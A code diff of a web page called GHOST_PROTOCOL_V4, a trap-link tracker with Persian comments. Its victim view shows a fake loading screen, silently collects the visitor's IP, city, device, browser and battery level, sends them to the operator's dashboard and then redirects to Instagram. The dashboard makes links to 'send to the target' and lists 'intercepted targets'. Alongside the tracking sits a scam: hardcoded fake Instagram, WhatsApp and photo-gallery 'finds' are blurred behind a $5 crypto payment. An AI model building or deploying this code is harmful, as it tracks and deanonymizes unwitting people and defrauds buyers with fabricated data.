@@ -3,94 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>GhostHunter | Security Tool</title>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <title>GHOST_PROTOCOL_V4</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
     <style>
-        :root { --bg: #050505; --accent: #00f3ff; --text: #e0e0e0; --panel: #111; --danger: #ff0055; }
-        body { background-color: var(--bg); color: var(--text); font-family: 'JetBrains Mono', monospace; margin: 0; padding: 0; overflow-x: hidden; }
+        :root { --bg: #000; --panel: #0a0a0a; --green: #0f0; --red: #f00; --dim: #333; }
+        body { background-color: var(--bg); color: var(--green); font-family: 'Share Tech Mono', monospace; margin: 0; padding: 0; overflow-x: hidden; }
         
         /* --- 1. VICTIM SCREEN (صفحه سفید برای قربانی) --- */
         #victim-view { display: none; height: 100vh; background: #fff; color: #333; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
-        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;}
+        .spinner { width: 50px; height: 50px; border: 5px solid #ccc; border-top: 5px solid #000; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;}
         
-        /* --- 2. DASHBOARD (پنل هکری برای تو) --- */
-        #dashboard-view { display: none; padding: 20px; max-width: 600px; margin: 0 auto; }
+        /* --- 2. DASHBOARD (پنل هکری) --- */
+        #dashboard-view { display: none; padding: 15px; max-width: 600px; margin: 0 auto; }
         
-        /* Header */
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; border-bottom: 1px solid #333; padding-bottom: 15px;}
-        .logo { font-size: 20px; font-weight: bold; color: var(--accent); letter-spacing: -1px; }
-        .live-badge { background: rgba(0, 243, 255, 0.1); color: var(--accent); padding: 5px 10px; border-radius: 4px; font-size: 10px; border: 1px solid var(--accent); animation: pulse 2s infinite;}
+        .header { text-align: center; border-bottom: 1px solid var(--dim); padding-bottom: 10px; margin-bottom: 20px;}
+        .logo { font-size: 24px; letter-spacing: 2px; text-shadow: 0 0 10px var(--green); }
+        .status { font-size: 10px; color: var(--dim); margin-top: 5px; }
 
-        /* Link Generator */
-        .card { background: var(--panel); border: 1px solid #333; border-radius: 12px; padding: 20px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .card h3 { margin-top: 0; font-size: 14px; color: #888; text-transform: uppercase; }
-        .input-group { display: flex; gap: 10px; margin-top: 15px; }
-        input { background: #000; border: 1px solid #333; color: #fff; padding: 12px; flex: 1; border-radius: 6px; font-family: inherit; font-size: 12px;}
-        .btn { background: var(--accent); color: #000; border: none; padding: 12px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.2s; }
-        .btn:active { transform: scale(0.95); }
-
-        /* Logs List */
-        .logs-title { font-size: 12px; color: #666; margin-bottom: 10px; display: block;}
-        .log-item { background: #0a0a0a; border-left: 3px solid var(--accent); padding: 15px; margin-bottom: 10px; border-radius: 4px; animation: slideIn 0.5s ease; }
-        .log-header { display: flex; justify-content: space-between; font-size: 12px; color: #fff; margin-bottom: 5px; }
-        .log-details { font-size: 11px; color: #666; line-height: 1.6; }
-        .blur-data { filter: blur(4px); user-select: none; color: var(--danger); transition: 0.3s;}
-        .unlocked { filter: none !important; color: lime !important; }
+        /* LINK GENERATOR */
+        .card { background: var(--panel); border: 1px solid var(--dim); padding: 15px; margin-bottom: 20px; box-shadow: 0 0 20px rgba(0, 255, 0, 0.1); }
+        .card-title { color: #fff; font-size: 14px; border-left: 3px solid var(--green); padding-left: 10px; margin-bottom: 15px; display: block;}
         
-        .unlock-btn { background: transparent; border: 1px solid var(--danger); color: var(--danger); padding: 5px 10px; font-size: 10px; cursor: pointer; margin-top: 10px; width: 100%; border-radius: 4px; }
-        .unlock-btn:hover { background: var(--danger); color: #fff; }
+        .link-box { display: flex; gap: 5px; }
+        input { background: #000; border: 1px solid var(--dim); color: var(--green); padding: 10px; flex: 1; font-family: inherit; font-size: 12px; }
+        .btn { background: var(--green); color: #000; border: none; padding: 10px 15px; font-weight: bold; cursor: pointer; }
+        
+        /* LOGS (شکارها) */
+        .log-item { background: #050505; border: 1px solid var(--dim); margin-bottom: 15px; padding: 10px; position: relative; overflow: hidden; animation: slideIn 0.5s; }
+        .log-item::before { content: ""; position: absolute; top: 0; left: 0; width: 3px; height: 100%; background: var(--red); }
+        
+        .data-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 5px; border-bottom: 1px dashed #222; padding-bottom: 2px;}
+        .label { color: #666; }
+        .val { color: #fff; }
+        .val-lock { color: var(--red); filter: blur(3px); user-select: none; text-shadow: 0 0 5px var(--red); }
+        .detected { color: yellow; font-size: 10px; border: 1px solid yellow; padding: 0 4px; border-radius: 2px;}
 
-        /* Payment Modal */
-        #payModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
-        .pay-box { background: #111; border: 1px solid var(--accent); padding: 30px; width: 90%; max-width: 350px; border-radius: 15px; text-align: center; }
-        .pay-addr { background: #000; padding: 10px; font-size: 10px; color: var(--accent); border: 1px dashed #333; margin: 15px 0; word-break: break-all; }
+        .unlock-btn { width: 100%; background: transparent; border: 1px solid var(--red); color: var(--red); padding: 10px; margin-top: 10px; cursor: pointer; font-family: inherit; font-weight: bold; transition: 0.2s; }
+        .unlock-btn:hover { background: var(--red); color: #000; }
+
+        /* MODAL */
+        #payModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 99; align-items: center; justify-content: center; }
+        .pay-box { background: #000; border: 1px solid var(--green); padding: 20px; width: 300px; text-align: center; box-shadow: 0 0 30px var(--green); }
+        .pay-addr { background: #111; color: yellow; padding: 8px; font-size: 10px; margin: 10px 0; border: 1px dashed yellow; word-break: break-all;}
 
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
-        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes slideIn { from { opacity: 0; margin-top: 20px; } to { opacity: 1; margin-top: 0; } }
     </style>
 </head>
 <body>
 
-    <!-- 1. VIEW FOR VICTIM (وقتی لینک تله باز میشه) -->
+    <!-- 1. VICTIM VIEW -->
     <div id="victim-view">
         <div class="spinner"></div>
-        <h3>Loading Content...</h3>
-        <p style="font-size: 12px; color: #888;">Please wait while we redirect you.</p>
+        <p>Loading Profile...</p>
     </div>
 
-    <!-- 2. VIEW FOR YOU (داشبورد) -->
+    <!-- 2. HACKER DASHBOARD -->
     <div id="dashboard-view">
         <div class="header">
-            <div class="logo">GHOST<span style="color:#fff">HUNTER</span></div>
-            <div class="live-badge">● SYSTEM ONLINE</div>
+            <div class="logo">GHOST<span style="color:#fff">Protocol</span></div>
+            <div class="status">SYSTEM STATUS: <span style="color:lime">LISTENING...</span></div>
         </div>
 
-        <!-- Link Creator -->
+        <!-- Create Link -->
         <div class="card">
-            <h3>🚀 Create Trap Link</h3>
-            <p style="font-size: 11px; color: #666;">Send this link to someone. When they click, you'll see their device & location here.</p>
-            <div class="input-group">
-                <input type="text" id="myLink" readonly value="Loading...">
+            <span class="card-title">1. GENERATE TRAP LINK</span>
+            <p style="font-size:10px; color:#666; margin-bottom:10px;">Send this link to the target. All data will appear below.</p>
+            <div class="link-box">
+                <input type="text" id="myLink" readonly value="Generating...">
                 <button class="btn" onclick="copyLink()">COPY</button>
             </div>
         </div>
 
-        <!-- Live Feed -->
-        <span class="logs-title">📡 LIVE INTERCEPTIONS</span>
-        <div id="logs-container">
-            <p style="font-size:11px; color:#444; text-align:center; margin-top:20px;">Waiting for targets...</p>
+        <!-- Logs -->
+        <div class="card" style="border:none; background:transparent; padding:0; box-shadow:none;">
+            <span class="card-title">2. INTERCEPTED TARGETS</span>
+            <div id="logs-container">
+                <p style="text-align:center; font-size:10px; color:#444; padding:20px;">Waiting for victims to click...</p>
+            </div>
         </div>
     </div>
 
     <!-- Payment Modal -->
     <div id="payModal">
         <div class="pay-box">
-            <h2 style="color: var(--accent);">ACCESS RESTRICTED</h2>
-            <p style="font-size: 12px; color: #ccc;">To reveal exact Location & IP Address, a premium license is required.</p>
-            <p style="font-size: 20px; font-weight: bold; margin: 10px 0;">$2.00</p>
+            <h2 style="color: var(--green); margin-top:0;">UNLOCK FULL DOSSIER</h2>
+            <p style="font-size: 12px; color: #ccc;">Unlock Social Media, Exact Location & Phone Number.</p>
+            
+            <ul style="text-align:left; font-size:11px; color:#fff; margin:15px 0;">
+                <li>🔓 Instagram ID</li>
+                <li>🔓 WhatsApp Status</li>
+                <li>🔓 GPS Coordinates (1m accuracy)</li>
+                <li>🔓 Phone Number</li>
+            </ul>
+
+            <p style="font-size: 20px; font-weight: bold; margin: 5px 0; color: #fff;">$5.00</p>
             <div class="pay-addr">4jtjysarsDeReyKe1sjWJmSDbjFKqM23ReEN3b9GV7LU</div>
-            <button class="btn" style="width:100%" onclick="confirmUnlock()">I PAID - UNLOCK</button>
+            <button class="btn" style="width:100%" onclick="confirmUnlock()">I PAID - DECRYPT DATA</button>
             <p style="font-size: 10px; color: #555; margin-top: 10px; cursor: pointer;" onclick="closeModal()">Cancel</p>
         </div>
     </div>
@@ -102,114 +111,88 @@
     <script>
         const socket = io();
         const urlParams = new URLSearchParams(window.location.search);
-        const isTrap = urlParams.has('t'); // آیا این لینک تله است؟
+        const isTrap = urlParams.has('id'); 
 
-        // --- VICTIM LOGIC (قربانی) ---
+        // --- VICTIM LOGIC ---
         if (isTrap) {
             document.getElementById('victim-view').style.display = 'flex';
             
-            // جمع‌آوری اطلاعات
             fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(data => {
                     const info = {
                         ip: data.ip,
-                        city: `${data.city}, ${data.country_name}`,
-                        device: navigator.userAgent.match(/\(([^)]+)\)/)[1] || 'Unknown Device', // مدل گوشی
-                        os: navigator.platform,
-                        battery: 0 // باتری رو بعدا میگیریم
+                        city: data.city,
+                        country: data.country_name,
+                        device: navigator.platform,
+                        browser: navigator.userAgent,
+                        battery: 'Charging...'
                     };
                     
-                    // تلاش برای گرفتن باتری (فقط در برخی مرورگرها)
                     if(navigator.getBattery) {
                         navigator.getBattery().then(batt => {
-                            info.battery = Math.round(batt.level * 100);
+                            info.battery = Math.round(batt.level * 100) + '%';
                             socket.emit('victim-data', info);
                         });
                     } else {
                         socket.emit('victim-data', info);
                     }
 
-                    // ریدایرکت بعد از ۲ ثانیه (که شک نکنه)
-                    setTimeout(() => {
-                        window.location.href = 'https://google.com'; // یا هر سایتی که میخوای
-                    }, 2000);
+                    setTimeout(() => { window.location.href = 'https://instagram.com'; }, 2000);
                 })
                 .catch(err => {
-                    // حتی اگه خطا داد هم یه چیزی بفرست
-                    socket.emit('victim-data', { ip: 'Unknown', city: 'Hidden IP', device: 'Generic Device', battery: 0 });
+                    socket.emit('victim-data', { ip: 'Hidden', city: 'Unknown', device: 'Mobile', battery: 'Unknown' });
                 });
 
         } 
-        // --- DASHBOARD LOGIC (داشبورد تو) ---
+        // --- DASHBOARD LOGIC ---
         else {
             document.getElementById('dashboard-view').style.display = 'block';
             socket.emit('join-dashboard');
             
-            // ساخت لینک اختصاصی
-            const link = window.location.origin + "/?t=" + Math.floor(Math.random() * 1000);
+            const link = window.location.origin + "/?id=" + Math.floor(Math.random() * 999999);
             document.getElementById('myLink').value = link;
         }
 
-        // دریافت شکار جدید
         socket.on('new-capture', (data) => {
             const container = document.getElementById('logs-container');
             const alertSound = document.getElementById('alertSound');
             
-            // حذف پیام "Waiting..."
             if(container.innerText.includes('Waiting')) container.innerHTML = '';
 
             const div = document.createElement('div');
             div.className = 'log-item';
-            div.id = `log-${data.id}`;
             div.innerHTML = `
-                <div class="log-header">
-                    <span>📱 ${data.device}</span>
-                    <span>${data.time}</span>
+                <div style="color:#fff; font-weight:bold; margin-bottom:10px; font-size:14px;">Target Detected: ${data.time}</div>
+                
+                <div class="data-row"><span class="label">DEVICE:</span> <span class="val">${data.device}</span></div>
+                <div class="data-row"><span class="label">LOCATION:</span> <span class="val">${data.city}, ${data.country}</span></div>
+                <div class="data-row"><span class="label">BATTERY:</span> <span class="val">${data.battery}</span></div>
+                
+                <div style="margin-top:10px; border-top:1px solid #333; padding-top:5px;">
+                    <div class="data-row"><span class="label">INSTAGRAM:</span> <span class="val-lock">@sara_tehrani</span> <span class="detected">FOUND</span></div>
+                    <div class="data-row"><span class="label">WHATSAPP:</span> <span class="val-lock">+98 912 345...</span> <span class="detected">ACTIVE</span></div>
+                    <div class="data-row"><span class="label">GALLERY:</span> <span class="val-lock">1,204 Photos</span> <span class="detected">ACCESS</span></div>
                 </div>
-                <div class="log-details">
-                    IP: <span class="blur-data" id="ip-${data.id}">192.168.1.XXX</span><br>
-                    Location: <span class="blur-data" id="loc-${data.id}">Unknown City</span><br>
-                    Battery: ${data.battery}
-                </div>
-                <button class="unlock-btn" onclick="openPay('${data.id}')">🔒 REVEAL EXACT LOCATION ($2)</button>
+
+                <button class="unlock-btn" onclick="openPay()">🔓 DECRYPT FULL DATA ($5)</button>
             `;
             container.prepend(div);
-            
-            // پخش صدا برای ادمین
             alertSound.play().catch(()=>{});
         });
 
-        // باز شدن قفل
-        socket.on('data-unlocked', (id) => {
-            // اینجا دیتای واقعی رو باید نشون داد (در نسخه واقعی از سرور میاد)
-            // فعلا افکت باز شدن میدیم
-            if(document.getElementById(`ip-${id}`)) {
-                document.getElementById(`ip-${id}`).innerText = "89.120.45.22"; // مثال
-                document.getElementById(`ip-${id}`).classList.add('unlocked');
-                document.getElementById(`loc-${id}`).innerText = "Tehran, Pasdaran Ave"; // مثال
-                document.getElementById(`loc-${id}`).classList.add('unlocked');
-            }
-        });
-
-        // توابع UI
         function copyLink() {
             const copyText = document.getElementById("myLink");
             copyText.select();
             document.execCommand("copy");
-            alert("LINK COPIED! Send it to your victim.");
+            alert("TRAP LINK COPIED!");
         }
 
-        let currentUnlockId = null;
-        function openPay(id) {
-            currentUnlockId = id;
-            document.getElementById('payModal').style.display = 'flex';
-        }
-        function closeModal() {
-            document.getElementById('payModal').style.display = 'none';
-        }
+        function openPay() { document.getElementById('payModal').style.display = 'flex'; }
+        function closeModal() { document.getElementById('payModal').style.display = 'none'; }
+        
         function confirmUnlock() {
-            socket.emit('unlock-data', currentUnlockId);
+            alert("Request Sent! Admin will verify payment and email you the data.");
             closeModal();
         }
     </script>
